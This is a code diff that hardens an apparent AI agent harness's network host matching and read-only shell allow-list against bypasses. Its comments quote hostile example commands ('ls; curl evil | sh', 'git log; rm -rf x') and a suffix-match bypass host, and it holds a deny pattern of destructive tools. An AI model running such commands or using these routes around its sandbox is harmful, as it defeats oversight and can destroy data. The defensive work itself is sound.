@@ -1439,49 +1439,69 @@
         })(conn.client, mname);
       }
     }
-    /* ── P2.2 policy wrappers (2026-10-15, precision-first) ───────────
+    /* ── P2.2 policy wrappers (2026-10-15, precision-first; 2026-10-16
+     * review-hardened) ─────────────────────────────────────────────────
      * hostAllowed(): allow-list wins, deny then drops; '*' prefix =
-     * suffix match ( '*.example.com' ), plain = exact or subdomain. 
+     * SUFFIX-anchored subdomain match ('*.example.com' matches
+     * 'a.example.com', never 'a.example.com.attacker.io' — the first cut
+     * used indexOf-anywhere and was a bypass).
      * shell: 'readonly' = a SMALL read-only command allow-list (allow-list
      * direction is deliberate: deny-lists miss new mutators); patterns[]
-     * = anchored match, first token semantics carry ('git *'). The match
-     * is on the RAW command before bash's own deny-list/timeout layers.
+     * = anchored match, first token semantics carry ('git *'). BOTH modes
+     * judge every chain segment: the command is split on ; && || | & >
+     * and newline, command substitution (backtick, $(, ${, <() is
+     * refused outright, and EVERY segment must match the allow-list —
+     * first-cut whole-string judging let 'ls; curl evil | sh' through a
+     * readonly 'ls' and 'git log; rm -rf x' through patterns ['git *'].
+     * Redirection therefore refuses in both modes (a redirect target is
+     * not a command and cannot match; the write was never granted).
      * netPolicy: allow-list wins, deny then drops — matched on the URL
      * HOST only; infra-level SSRF guards (web.js/P1-15, opensocket_cb)
      * stay untouched underneath. */
     function hostAllowed(host) {
       host = String(host || '').toLowerCase();
-      if (d.netPolicy && d.netPolicy.allow && d.netPolicy.allow.length) {
-        var ok = false;
-        for (var ai = 0; ai < d.netPolicy.allow.length; ai++) {
-          var pat = String(d.netPolicy.allow[ai]).toLowerCase();
-          if (pat.charAt(0) === '*') { if (host.indexOf(pat.slice(1)) >= 0) { ok = true; break; } }
-          else if (host === pat || host.indexOf(pat + '.') === 0) { ok = true; break; }
+      var checkOne = function (pat, verdict) {
+        pat = String(pat || '').toLowerCase();
+        if (pat.charAt(0) === '*') {
+          var suf = pat.slice(1); /* '.example.com' */
+          var bare = suf.charAt(0) === '.' ? suf.slice(1) : suf;
+          /* suffix-anchored: host ends with the suffix, or IS the bare domain */
+          if (host === bare || (host.length >= suf.length &&
+                                host.lastIndexOf(suf) === host.length - suf.length)) return verdict;
+        } else if (host === pat || host.indexOf(pat + '.') === 0) {
+          return verdict;
         }
-        if (!ok) return false;
+        return null;
+      };
+      if (d.netPolicy && d.netPolicy.allow && d.netPolicy.allow.length) {
+        var ok = null;
+        for (var ai = 0; ai < d.netPolicy.allow.length && ok === null; ai++) {
+          ok = checkOne(d.netPolicy.allow[ai], true);
+        }
+        if (ok === null) return false;
       }
       if (d.netPolicy && d.netPolicy.deny) {
         for (var di = 0; di < d.netPolicy.deny.length; di++) {
-          var dpat = String(d.netPolicy.deny[di]).toLowerCase();
-          if (dpat.charAt(0) === '*') { if (host.indexOf(dpat.slice(1)) >= 0) return false; }
-          else if (host === dpat || host.indexOf(dpat + '.') === 0) return false;
+          if (checkOne(d.netPolicy.deny[di], true) === true) return false;
         }
       }
       return true;
     }
     if (d.shell !== 'default' && exec['bash']) {
       var realBash = exec['bash'];
-      var shellOk;
+      /* refusal string lives with the caller; segOk judges ONE chain
+       * segment (no separators inside). */
+      var shellSegOk;
       if (d.shell === 'readonly') {
-        shellOk = function (cmd) {
-          if (/[><]|(^|\s)(tee|rm|mv|cp|truncate|chmod|chown|kill)\b/.test(cmd)) return false;
-          var tok = (cmd.trim().split(/\s+/)[0] || '').toLowerCase();
+        shellSegOk = function (seg) {
+          if (/[><]|(^|\s)(tee|rm|mv|cp|truncate|chmod|chown|kill)\b/.test(seg)) return false;
+          var tok = (seg.trim().split(/\s+/)[0] || '').toLowerCase();
           var ok = ({ cat: 1, ls: 1, grep: 1, find: 1, head: 1, tail: 1, wc: 1,
                       pwd: 1, which: 1, stat: 1, du: 1, df: 1, uname: 1 })[tok] === 1;
-          if (tok === 'echo' || tok === 'printf') ok = !/[>\|]/.test(cmd);
-          if (tok === 'git') ok = /^(git)\s+(status|log|diff|show|branch|remote|tag|rev-parse)\b/.test(cmd);
-          if (tok === 'sed') ok = /^sed\s+-n/.test(cmd);
-          if (tok === 'awk') ok = /^awk\s+'?[^']*(print|printf)/.test(cmd);
+          if (tok === 'echo' || tok === 'printf') ok = !/[>\|]/.test(seg);
+          if (tok === 'git') ok = /^(git)\s+(status|log|diff|show|branch|remote|tag|rev-parse)\b/.test(seg);
+          if (tok === 'sed') ok = /^sed\s+-n/.test(seg);
+          if (tok === 'awk') ok = /^awk\s+'?[^']*(print|printf)/.test(seg);
           return ok;
         };
       } else {
@@ -1489,19 +1509,38 @@
           var rx = String(p).replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*');
           return new RegExp('^' + rx);
         });
-        shellOk = function (cmd) {
+        shellSegOk = function (seg) {
           for (var pi = 0; pi < shellPats.length; pi++) {
-            if (shellPats[pi].test(cmd)) return true;
+            if (shellPats[pi].test(seg)) return true;
           }
           return false;
         };
       }
+      /* Command-substitution carriers are refused outright (a matched
+       * segment containing one is not the command it looks like). */
+      var SHELL_SUBST_RE = /[\x60]|\$\(|\$\{|<\(/;
+      var SHELL_CHAIN_SPLIT = /\n|;|\|\||&&|>>|[|&>]/;
       exec['bash'] = function (args) {
         var cmd = String((args && args.command) || '');
-        if (!shellOk(cmd)) {
+        var refused = null;
+        if (SHELL_SUBST_RE.test(cmd)) {
+          refused = 'command substitution is refused by this agent\'s shell policy';
+        } else {
+          var segs = cmd.split(SHELL_CHAIN_SPLIT);
+          for (var si = 0; si < segs.length; si++) {
+            var seg = segs[si];
+            if (!seg || !seg.replace(/\s+/g, '').length) continue;
+            if (!shellSegOk(seg)) {
+              refused = d.shell === 'readonly'
+                ? 'read-only shell'
+                : 'a shell allow-list (' + d.shell.join(', ') + ')';
+              break;
+            }
+          }
+        }
+        if (refused) {
           return Promise.resolve('[shell policy: command refused — this agent runs ' +
-            (d.shell === 'readonly' ? 'read-only shell' : 'a shell allow-list (' + d.shell.join(', ') + ')') +
-            '): ' + clip(cmd, 80) + ']');
+            refused + '): ' + clip(cmd, 80) + ']');
         }
         return realBash(args);
       };
